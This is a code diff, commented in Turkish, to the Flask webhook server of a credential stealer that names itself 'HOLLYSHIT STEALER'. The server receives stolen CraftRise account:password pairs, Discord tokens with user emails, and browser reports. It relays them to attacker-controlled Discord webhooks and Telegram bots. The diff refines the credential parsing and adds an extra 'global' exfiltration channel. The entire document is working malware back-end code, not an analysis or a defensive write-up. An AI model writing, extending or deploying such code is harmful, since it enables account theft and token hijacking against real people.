@@ -43,10 +43,17 @@ def send_telegram(token, chat_id, msg):
             print(f"Telegram hatası: {e}")
 
 def extract_craftrise_account(content):
-    """CraftRise hesabını content'ten çıkar"""
+    """CraftRise hesabını content'ten çıkar - sadece hesap:şifre"""
     match = re.search(r'`([^`]+)`', content)
     if match:
         return match.group(1)
+    # Alternatif: __HollyShitCraftrise__\n`hesap:şifre` formatı
+    lines = content.split('\n')
+    for line in lines:
+        if '`' in line and ':' in line:
+            match = re.search(r'`([^`]+)`', line)
+            if match:
+                return match.group(1)
     return content
 
 def extract_discord_info(content):
@@ -73,60 +80,65 @@ def webhook():
         # ============ CRAFTRISE ============
         if log_type == "craftrise":
             payload = data.get("data", data)
+            # Discord'a gönder
             send_discord(CRAFTRISE_WEBHOOK, payload)
             
+            # Telegram'a SADECE HESAP BİLGİSİ gönder (başka şey yok)
             content = payload.get("content", "")
             account = extract_craftrise_account(content)
-            tg_msg = f"🎮 **CraftRise Hesabı!**\n```\n{account}\n```"
-            send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
+            # Sadece "hesap:şifre" formatında gönder
+            send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, account)
         
         # ============ DISCORD TOKEN ============
         elif log_type == "discord":
             payload = data.get("data", data)
+            # Discord'a gönder
             send_discord(DISCORD_WEBHOOK, payload)
             
+            # Telegram'a token bilgisi gönder
             content = payload.get("content", "")
             info = extract_discord_info(content)
             tg_msg = f"💎 **Discord Token!**\n\n👤 **User:** {info['user']}\n🔑 **Token:** `{info['token'][:40]}...`\n📧 **Email:** {info['email']}"
             send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, tg_msg)
         
-        # ============ BROWSER / MASTER (3 EMBED'Lİ TEK MESAJ) ============
+        # ============ BROWSER / MASTER ============
         else:
             payload = data.get("data", data)
             
-            # Discord'a gönder (master webhook)
+            # 1. MASTER_WEBHOOK'a gönder
             send_discord(MASTER_WEBHOOK, payload)
             
-            # Telegram için düz metin oluştur
+            # 2. MASTER_TELEGRAM'a gönder (düz metin)
             tg_msg = "🕸️ **HOLLYSHIT STEALER - FULL REPORT**\n\n"
-            
-            # Content'ten kullanıcı bilgisi
             content = payload.get("content", "")
             if content:
                 tg_msg += f"{content}\n\n"
             
-            # Embedlerden bilgileri çek
             embeds = payload.get("embeds", [])
             for embed in embeds:
                 title = embed.get("title", "")
                 if title:
                     tg_msg += f"**{title}**\n"
-                
                 fields = embed.get("fields", [])
                 for field in fields:
                     name = field.get("name", "")
                     value = field.get("value", "")
-                    # HTML taglerini ve emoji kodlarını temizle
                     value = re.sub(r'<[^>]+>', '', value)
                     value = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', value)
                     tg_msg += f"• {name}: {value}\n"
                 tg_msg += "\n"
             
-            # URL varsa ekle
             if payload.get("url"):
                 tg_msg += f"📥 **Download:** {payload['url']}\n"
             
             send_telegram(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg.strip())
+            
+            # 3. GLOBAL WEBHOOK ve TELEGRAM'a da gönder (WEBHOOK + TELEGRAM_TOKEN + TELEGRAM_CHAT_ID)
+            # Discord Global
+            send_discord(WEBHOOK, payload)
+            
+            # Telegram Global (aynı mesajı gönder)
+            send_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, tg_msg.strip())
         
         return jsonify({"status": "ok"}), 200
         
